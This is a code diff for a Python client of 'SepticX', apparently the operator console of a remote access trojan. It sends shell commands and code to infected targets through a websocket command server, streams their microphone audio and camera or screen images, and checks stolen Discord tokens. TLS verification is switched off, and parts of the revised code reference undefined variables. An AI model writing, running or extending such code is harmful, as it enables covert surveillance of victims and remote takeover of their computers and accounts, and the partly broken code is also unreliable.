@@ -1,4 +1,4 @@
-import multiprocessing, threading, websocket, requests, asyncio, pyaudio, base64, json, time, glob, cv2, ssl, os, io
+import multiprocessing, threading, websocket, requests, pyaudio, base64, json, time, glob, cv2, ssl, os, io
 from websocket import create_connection
 from playsound import playsound
 from PIL import Image, ImageTk
@@ -76,10 +76,7 @@ class Main:
     def check(self, token):
         return requests.get('https://discord.com/api/v9/users/@me', headers={'authorization': token}).status_code == 200
 
-    def send_command(self, command, target, type=None):
-        if type == "cmd":
-            command = f'''import subprocess\nsubprocess.call("""{command}""", shell=True)'''
-
+    def send_command(self, command, target):
         self.ws.send(json.dumps({
             "code": command,
             "target": target
@@ -127,21 +124,22 @@ class Main:
                     command = input('>> ')
                 except KeyboardInterrupt:
                     break
-
+                
+                try:
+                    ws.send(command)
                 except Exception as e:
-                    self.ws = self.establishConnection()
-                    ws = self.ws
-
-                ws.send(command)
+                    ws = self.establishConnection()
 
                 timer = threading.Timer(15., ws.close)
                 timer.start()
 
                 try:
                     print(ws.recv())
-                    timer.cancel()
                 except KeyboardInterrupt:
                     break
+
+                except Exception as e:
+                    ws = self.establishConnection()
 
                 except websocket._exceptions.WebSocketConnectionClosedException:
                     pass
@@ -150,6 +148,9 @@ class Main:
                     self.ws = self.establishConnection()
                     ws = self.ws
                     print("[SepticX Handler]: Timeour Error Occured")
+                    
+                else:
+                    timer.cancel()
 
         def establishConnection(self):
             ws = create_connection(f'wss://{self.host}/api/ws/readShell', sslopt={"cert_reqs": ssl.CERT_NONE})
@@ -163,6 +164,7 @@ class Main:
             self.host = host
             self.Stop = False
             self.target = target
+            self.ws = self.establishConnection()
             self.play()
 
         def play(self):
@@ -172,7 +174,7 @@ class Main:
             RATE = 8000
             RECORD_SECONDS = 5
 
-
+            ws = self.ws
             p = pyaudio.PyAudio()
 
             stream = p.open(format = FORMAT,
@@ -182,12 +184,17 @@ class Main:
                 output = True,
                 frames_per_buffer = chunk)
             
+            try:
+                while not self.Stop:
+                    stream.write(base64.b64decode(ws.recv()))
+            except:
+                ws = self.establishConnection()
+
+        def establishConnection(self):
             ws = create_connection(f"wss://{self.host}/api/ws/playAudio")
             ws.send(self.key)
             ws.send(self.target)
-            
-            while True:
-                stream.write(base64.b64decode(ws.recv()))
+            return ws
 
         def stop(self):
             self.Stop = True
@@ -196,48 +203,41 @@ class Main:
         def __init__(self, target, option, host, key):
             self.key = key
             self.host = host
+            self.target = target
             self.Stop = False
-            self.display(target, option)
+            self.ws = self.establishConnection()
+            self.display(option)
 
-        def edit(self, panel, data):
-            try:
-                f = io.BytesIO(data)
-                pilimage = Image.open(f)
-                img = ImageTk.PhotoImage(pilimage)
-                panel.configure(image=img)
-                panel.image = img
-            except Exception as e:
-                self.Stop = True
-
-        def update(self, panel, endpoint, ws, target):
+        def update(self, panel, endpoint):
             start_time = time.time()
+            ws = self.ws
+
             while not self.Stop:
+
                 try:
-                    recv_data = json.loads(ws.recv())
+                    recv_data = ws.recv()
+                    data = base64.b64decode(recv_data)
+
+                    f = io.BytesIO(data)
+                    pilimage = Image.open(f)
+                    img = ImageTk.PhotoImage(pilimage)
+                    panel.configure(image=img)
+                    panel.image = img
                 except KeyboardInterrupt:
                     break
 
-                except Exception as e:
-                    print(e)
-                    ws = create_connection(f"wss://{self.host}/api/ws/{endpoint}")
-                    ws.send(self.key)
-                    ws.send(target)
-                    continue
-
-                try:
-                    data = base64.b64decode(recv_data["data"])
-                    threading.Thread(target=self.edit, args=(panel, data)).start()
                 except Exception as e:
                     print(e)
                     ws = create_connection(f"wss://{self.host}/api/ws/{endpoint}", sslopt={"cert_reqs": ssl.CERT_NONE})
                     ws.send(self.key)
                     ws.send(target)
 
-        def display(self, target, option):
+        def display(self, option):
             window = tk.Tk()
             window.title("SepticX Client")
             window.geometry("300x300")
             window.configure(background='grey')
+            
             if not option:
                 endpoint = "showCamera"
             else:
@@ -245,16 +245,10 @@ class Main:
 
             ws = create_connection(f"wss://{self.host}/api/ws/{endpoint}")
             ws.send(self.key)
-            ws.send(target)
+            ws.send(self.target)
 
-            recv = ws.recv()
-
-            while True:
-                try:
-                    data = base64.b64decode(json.loads(recv)["data"])
-                    break
-                except json.decoder.JSONDecodeError:
-                    pass
+            ws.recv()
+            data = base64.b64decode(ws.recv())
 
             f = io.BytesIO(data)
             pilimage = Image.open(f)
@@ -262,8 +256,14 @@ class Main:
             panel = tk.Label(window, image=img)
             panel.pack(side="bottom", fill="both", expand="yes")
 
-            threading.Thread(target=self.update, args=(panel,endpoint,ws,target)).start()
+            threading.Thread(target=self.update, args=(panel, endpoint)).start()
             window.mainloop()
+
+        def establishConnection(self):
+            ws = create_connection(f"wss://{self.host}/api/ws/{endpoint}")
+            ws.send(self.key)
+            ws.send(self.target)
+            return ws
 
         def stop(self):
             self.Stop = True
